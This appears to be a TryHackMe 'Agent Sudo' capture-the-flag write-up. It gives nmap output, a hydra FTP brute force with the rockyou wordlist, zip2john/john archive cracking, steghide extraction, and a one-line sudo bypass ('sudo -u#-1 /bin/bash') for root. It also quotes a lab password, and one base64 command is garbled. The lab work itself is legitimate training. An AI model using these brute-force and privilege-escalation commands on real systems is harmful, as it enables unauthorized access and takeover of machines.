#Agent Sudo

https://tryhackme.com/room/agentsudoctf

```nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 04:35 EDT
Nmap scan report for agent-sudo (10.10.158.237)
Host is up (0.33s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.41 seconds
```
##Enumration
1. 3
2. 
```change user-agent by firefox add-on (user agent switcher to C)
user-agent
```
3. 
```by changing user agent
<redacted>
```

##Hash Cracking and brute-forcing
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agent-sudo
```
1. found by using hydra
```
[21][ftp] host: agent-sudo   login: chris   password: <redacted>
```
2. 
```TO_agentJ
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
```bash
zip2john 8702.zip > forjohn
john --wordlist=/usr/share/wordlist/rockyou.txt forjohn 
```
```zip
<redacted>
```
```To_agentR
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
```bash
echo QXJlYTUx > bas364 -d
```
```
<redacted>
```
3. 
```bash
steghide extract -sf cute_alien.jpg
<redacted>
```
```message.txt from cute_jpg.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
```
<redacted>
```

##Capture the user flag
1. 
```bash
ssh james@agent-sudo
```
```user-flag
<redacted>
```
```by using google reverse image to search the Alien_autopsy.jpg
****** alien ******
```

##Privilege Escalation

```firefox cve sudo
CVE-2019-*****
```
```bash
sudo -u#-1 /bin/bash
```
```root_flag
<redacted>
```
```a.k.a AgentR
<redacted>
```
